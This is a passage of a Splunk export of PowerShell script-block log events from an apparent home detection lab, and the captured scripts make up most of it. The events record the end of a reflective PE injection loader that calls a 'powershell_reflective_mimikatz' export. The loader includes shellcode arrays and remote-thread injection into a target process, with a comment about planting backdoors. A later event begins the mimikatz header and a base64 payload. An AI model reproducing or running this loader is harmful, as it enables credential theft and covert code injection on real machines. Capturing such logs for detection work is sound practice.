([Bool])\n\t\t\t\t$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\n\t\t\t\t\n\t\t\t\t$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\n\t\t\t\tif ($PEInfo.PE64Bit -eq $true)\n\t\t\t\t{\n\t\t\t\t\t#Shellcode: CallDllMain.asm\n\t\t\t\t\t$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)\n\t\t\t\t\t$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)\n\t\t\t\t\t$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t#Shellcode: CallDllMain.asm\n\t\t\t\t\t$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)\n\t\t\t\t\t$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)\n\t\t\t\t\t$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)\n\t\t\t\t}\n\t\t\t\t$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)\n\t\t\t\t$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n\t\t\t\t$SCPSMemOriginal = $SCPSMem\n\t\t\t\t\n\t\t\t\tWrite-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem\n\t\t\t\t$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)\n\t\t\t\t[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)\n\t\t\t\t$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\tWrite-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem\n\t\t\t\t$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)\n\t\t\t\t[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)\n\t\t\t\t$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\tWrite-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem\n\t\t\t\t$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)\n\t\t\t\t\n\t\t\t\t$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n\t\t\t\tif ($RSCAddr -eq [IntPtr]::Zero)\n\t\t\t\t{\n\t\t\t\t\tThrow \"Unable to allocate memory in the remote process for shellcode\"\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)\n\t\t\t\tif (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n\t\t\t\t{\n\t\t\t\t\tThrow \"Unable to write shellcode to remote process memory.\"\n\t\t\t\t}\n\n\t\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions\n\t\t\t\t$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\n\t\t\t\tif ($Result -ne 0)\n\t\t\t\t{\n\t\t\t\t\tThrow \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n\t\t\t}\n\t\t}\n\t\telseif ($PEInfo.FileType -ieq \"EXE\")\n\t\t{\n\t\t\t#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process\n\t\t\t[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)\n\t\t\t[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)\n\t\t\t$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr\n\n\t\t\t#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread\n\t\t\t#\tThis way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.\n\t\t\t[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\tWrite-Verbose \"Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in.\"\n\n\t\t\t$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null\n\n\t\t\twhile($true)\n\t\t\t{\n\t\t\t\t[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)\n\t\t\t\tif ($ThreadDone -eq 1)\n\t\t\t\t{\n\t\t\t\t\tCopy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants\n\t\t\t\t\tWrite-Verbose \"EXE thread has completed.\"\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tStart-Sleep -Seconds 1\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn @($PEInfo.PEHandle, $EffectivePEHandle)\n\t}\n\t\n\t\n\tFunction Invoke-MemoryFreeLibrary\n\t{\n\t\tParam(\n\t\t[Parameter(Position=0, Mandatory=$true)]\n\t\t[IntPtr]\n\t\t$PEHandle\n\t\t)\n\t\t\n\t\t#Get Win32 constants and functions\n\t\t$Win32Constants = Get-Win32Constants\n\t\t$Win32Functions = Get-Win32Functions\n\t\t$Win32Types = Get-Win32Types\n\t\t\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\n\t\t#Call FreeLibrary for all the imports of the DLL\n\t\tif ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n\t\t{\n\t\t\t[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)\n\t\t\t\n\t\t\twhile ($true)\n\t\t\t{\n\t\t\t\t$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)\n\t\t\t\t\n\t\t\t\t#If the structure is null, it signals that this is the end of the array\n\t\t\t\tif ($ImportDescriptor.Characteristics -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.FirstThunk -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.ForwarderChain -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.Name -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.TimeDateStamp -eq 0)\n\t\t\t\t{\n\t\t\t\t\tWrite-Verbose \"Done unloading the libraries needed by the PE\"\n\t\t\t\t\tbreak\n\t\t\t\t}\n\n\t\t\t\t$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))\n\t\t\t\t$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)\n\n\t\t\t\tif ($ImportDllHandle -eq $null)\n\t\t\t\t{\n\t\t\t\t\tWrite-Warning \"Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways\" -WarningAction Continue\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)\n\t\t\t\tif ($Success -eq $false)\n\t\t\t\t{\n\t\t\t\t\tWrite-Warning \"Unable to free library: $ImportDllPath. Continuing anyways.\" -WarningAction Continue\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))\n\t\t\t}\n\t\t}\n\t\t\n\t\t#Call DllMain with process detach\n\t\tWrite-Verbose \"Calling dllmain so the DLL knows it is being unloaded\"\n\t\t$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])\n\t\t$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\n\t\t\n\t\t$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null\n\t\t\n\t\t\n\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\tif ($Success -eq $false)\n\t\t{\n\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t}\n\t}\n\n\n\tFunction Main\n\t{\n\t\t$Win32Functions = Get-Win32Functions\n\t\t$Win32Types = Get-Win32Types\n\t\t$Win32Constants =  Get-Win32Constants\n\t\t\n\t\t$RemoteProcHandle = [IntPtr]::Zero\n\t\n\t\t#If a remote process to inject in to is specified, get a handle to it\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \"\"))\n\t\t{\n\t\t\tThrow \"Can't supply a ProcId and ProcName, choose one or the other\"\n\t\t}\n\t\telseif ($ProcName -ne $null -and $ProcName -ne \"\")\n\t\t{\n\t\t\t$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\n\t\t\tif ($Processes.Count -eq 0)\n\t\t\t{\n\t\t\t\tThrow \"Can't find process $ProcName\"\n\t\t\t}\n\t\t\telseif ($Processes.Count -gt 1)\n\t\t\t{\n\t\t\t\t$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId\n\t\t\t\tWrite-Output $ProcInfo\n\t\t\t\tThrow \"More than one instance of $ProcName found, please specify the process ID to inject in to.\"\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$ProcId = $Processes[0].ID\n\t\t\t}\n\t\t}\n\t\t\n\t\t#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.\n\t\t#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\n#\t\t{\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n#\t\t}\t\n\t\t\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\n\t\t{\n\t\t\t$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\t\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t{\n\t\t\t\tThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n\t\t\t}\n\t\t\t\n\t\t\tWrite-Verbose \"Got the handle for the remote process to inject in to\"\n\t\t}\n\t\t\n\n\t\t#Load the PE reflectively\n\t\tWrite-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\n        try\n        {\n            $Processors = Get-WmiObject -Class Win32_Processor\n        }\n        catch\n        {\n            throw ($_.Exception)\n        }\n\n        if ($Processors -is [array])\n        {\n            $Processor = $Processors[0]\n        } else {\n            $Processor = $Processors\n        }\n\n        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n        {\n            Write-Verbose ( \"Architecture: \" + $Processor.AddressWidth + \" Process: \" + ([System.IntPtr]::Size * 8))\n            Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop\n        }\n\n        #Determine whether or not to use 32bit or 64bit bytes\n        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n        }\n        else\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n        }\n        $PEBytes[0] = 0\n        $PEBytes[1] = 0\n\t\t$PEHandle = [IntPtr]::Zero\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\n\t\t}\n\t\tif ($PELoadedInfo -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tThrow \"Unable to load PE, handle returned is NULL\"\n\t\t}\n\t\t\n\t\t$PEHandle = $PELoadedInfo[0]\n\t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\n\t\t\n\t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t{\n\t\t\t#########################################\n\t\t\t### YOUR CODE GOES HERE\n\t\t\t#########################################\n                    Write-Verbose \"Calling function with WString return type\"\n\t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\t\t\t\t    if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t\t    Throw \"Couldn't find function address.\"\n\t\t\t\t    }\n\t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\t\t\t\t    }\n\t\t\t\t    else\n\t\t\t\t    {\n\t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\t        Write-Output $Output\n\t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\t\t\t\t    }\n\t\t\t#########################################\n\t\t\t### END OF YOUR CODE\n\t\t\t#########################################\n\t\t}\n\t\t#For remote DLL injection, call a void function which takes no parameters\n\t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t{\n\t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\t\t\t{\n\t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\t\t\t}\n\t\t\t\n\t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\n\t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t}\n\t\t\n\t\t#Don't free a library if it is injected in a remote process\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t}\n\t\telse\n\t\t{\n\t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t}\n\t\t}\n\t\t\n\t\tWrite-Verbose \"Done!\"\n\t}\n\n\tMain\n}\n438f26a2-c819-4c7b-8c04-cf51a6b39a9d","_time":"2025-11-23T14:38:46.688+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"328","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"328","index":"mydfir-project","linecount":"392","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"4104","EventType":"3","KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA":"'\n\n  \t# mimikatz 2.2.0 (win 32) #18362\n    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 \n    # VirusTotal Analysis: no signature yet ;)\n    $PEBytes32 = '","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Splunk","OpCode":"On","RecordNumber":"227","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:38:46.648 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=227\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AoABAEAAEChSKFooXCheKGAoZihoKGoodii8KL4ooijkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKoAAADgCgAQAAAAOKFAoUihAAAA8AoAEAEAANCg4KDwoPigAKEIoRChGKEgoSihOKFAoUihUKFYoWChaKFwoYihmKGgoaihsKG4oYCjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pgCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqmKoAAAAACwDAAAAA8Kn4qQCqCKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAQCwAgAQAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qAAgCwBsAQAA4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AMAsAbAAAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMAUAsASAAAACioMKi4rsiu2K7orviuCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvoK+wr8Cv0K/gr/CvAAAAYAsA/AEAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgoniiiKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo3CjgKOQo6CjsKPAo9CjYKRopHCkeKSApIikkKSYpKCkqKSwpLikQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKywrLiswKzIrNCs4KzorPCs+KwArQitEK0YrSCtKK0wrTitQK1IrWiteK2IraCt8K74rgCvCK8wr6ivsK+4r8Cv0K/Yr+Cv6K/wr/ivAHALAJAAAAAAoAigEKAYoCCgKKAwoDigQKBIoGCgeKCQoKigwKDYoPCgCKEgoTihUKFooYChmKGwocih4KH4oRCiKKI4osCiyKLQotii4KLoovCi+KIgoyijMKM4o2CjuKOgpKiksKTApOCkaKUgpiimMKY4pmCmuKbwqACpCKkQqRipQKkAqgiqEKoYqkCqAIALAAABAACQpZiloKWopdClgKagprCmuKbAptCm8Kawp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhQqFioYKhoqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipYKnYqeCp6Knwq/irAKwIrBCsKKxArFiscKyIrKCsuKzQrOisAK0YrTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitCK4QrhiuIK4orjCuOK5IrlCuWK5groCuiK6QrpiuoK6orrCuuK7Arsiu0K4AAACQCwBsAAAAaKdwp3ingKeIp5CnOKhAqEioUKhYqJiooKioqLCoCKkQqhiqIKooqjCqSKpQqliqYKpoqnCqeKqAqoiqkKqYqqCqyKrQqqitsK24rcCtyK3Qrdit4K3orfCt+K0AriiuMK4AAACgCwAcAAAAWKFoobCsuKzArMis0KzYrOCsAAAAsAsAaAEAAACnCKcQpxinIKcopzCnAKgIqBCoGKggqCioMKhwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKtIq1CrWKtgq2ircKt4q4CriKuQq5iroKuoq7CruKvAq8ir0KvYq+Cr6Kvwq/irAKwQrCCsKKwwrDisSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcit0K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Arsiu0K7grgivEK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AwAsABAMAAACgCKAQoBigIKAooDCgOKBAoEigUKBooHCgeKCAoIigkKDgoOig8KD4oDChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKHIoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJQoliiYKJoonCieKKAooiikKKYoqCiqKKworiiwKLIotCi2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNQo2ijcKOAo5CjmKOgo7CjuKPQo9ij8KP4oxCkGKQgpDCkOKRApFCkWKRgpHCkeKSQpJiksKS4pNCk2KTwpPikEKUYpTClOKVQpVilcKV4pZClmKWgpbCluKXApdCl2KXgpeilAKYYpjCmOKaApoimkKaYpqCmqKYApyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYpwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqLCouKjIqNCo2KjgqOio8Kj4qACpCKkQqRipIKkoqTCpOKlAqUipgKmoqbCpuKnAqcip0KnYqfCp+KkAqgiqEKoYqiCqKKowqjiqQKpIqlCqWKpgqmiqcKqAqoiqmKqgqrCquKrIqtCq4KroqviqAKsQqxirKKswqzirUKtoq3CriKugq6irsKu4q8CryKvQq9ir4Kvoq